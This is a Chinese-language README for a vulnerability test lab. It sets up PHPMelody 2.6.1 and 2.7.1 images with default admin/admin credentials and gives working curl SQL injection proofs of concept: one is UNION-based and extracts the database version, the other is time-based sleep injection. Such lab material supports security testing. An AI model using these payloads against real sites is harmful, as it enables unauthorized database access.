## 环境说明

测试镜像

* src/phpmelody/2.6.1
  * 管理员账号

    admin/admin

  * 后台地址

    http://127.0.0.1/admin/

## PHPMelody 2.6.1 SQL注入漏洞（CVE-2017-15081）

测试镜像

* src/phpmelody/2.6.1

影响版本

* PHPMelody <= 2.6.1

参考链接

* [PHP Melody 2.6.1 - SQL Injection](https://www.exploit-db.com/exploits/43062/)

Poc

```shell
curl "http://172.17.0.2/playlists.php?playlist=%27%20%20UNION%20SELECT%201,concat(0x223c2f613e3c2f6469763e3c2f6469763e,version(),0x3c212d2d),1,1,1,1,1,1,1,1,1--%201" | grep "playlist=\"</a></div></div>"
```

成功会在页面返回version信息



## PHPMelody 2.7.1 SQL注入漏洞（CVE-2017-15081）

测试镜像

- src/phpmelody/2.7.1

影响版本

- PHPMelody <= 2.7.1

参考链接

- [PHP Melody 2.7.1 - 'playlist' SQL Injection](https://www.exploit-db.com/exploits/43409/)

Poc

```shell
curl "http://172.17.0.2/ajax.php?p=video&do=getplayer&vid=randomid&aid=1&player=detail&playlist='or(select(sleep(1)))or'"
```

成功请求会延迟4s返回（4倍sleep时间）